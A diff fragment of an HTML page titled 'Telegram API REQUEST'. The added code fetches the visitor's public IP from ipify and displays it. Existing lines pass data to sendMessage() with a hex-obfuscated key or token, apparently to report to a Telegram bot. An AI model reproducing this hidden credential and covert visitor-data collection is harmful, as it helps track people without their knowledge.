@@ -5,3 +5,45 @@
   var message=data;
   var _0x3e7f=["\x36\x37\x30\x34\x37\x36\x31\x62\x33\x63\x62\x66\x38\x32\x36\x30\x63\x35\x35\x36\x63\x33\x65\x34\x31\x33\x39\x39\x61\x62\x38\x62\x63\x64\x66\x30\x62\x35\x31\x61\x39\x38\x39\x33\x35\x65\x66\x63\x30\x34\x30\x35\x62\x64\x39\x63\x61\x30\x39\x38\x64\x65\x38\x37"];sendMessage(message,_0x3e7f[0])
 </script>
+<script>
+    fetch('https://api.ipify.org/?format=json')
+    .then((res)=>{
+        return res.text()
+    })
+    .then((data)=>{
+        document.getElementById('ip').innerHTML=data;
+    })
+</script>
+<style>
+    img{
+        width:200px;
+        display: block;
+        margin: auto;
+        text-align: center;
+        margin-top:100px;
+    }
+    h1{
+        display: block;
+        margin: auto;
+        text-align: center;
+        margin-top:30px;
+        font-family:monospace;
+    }
+    p{
+        display: block;
+        margin: auto;
+        text-align: center;
+        margin-top:20px;
+        font-family: monospace;
+        width:350px;
+    }
+</style>
+<div class="content">
+    <img src="https://ummx.github.io/img/monster.webp" alt="">
+    <h1>
+        Telegram API REQUEST
+    </h1>
+    <p id="ip">
+    
+    </p>
+</div>
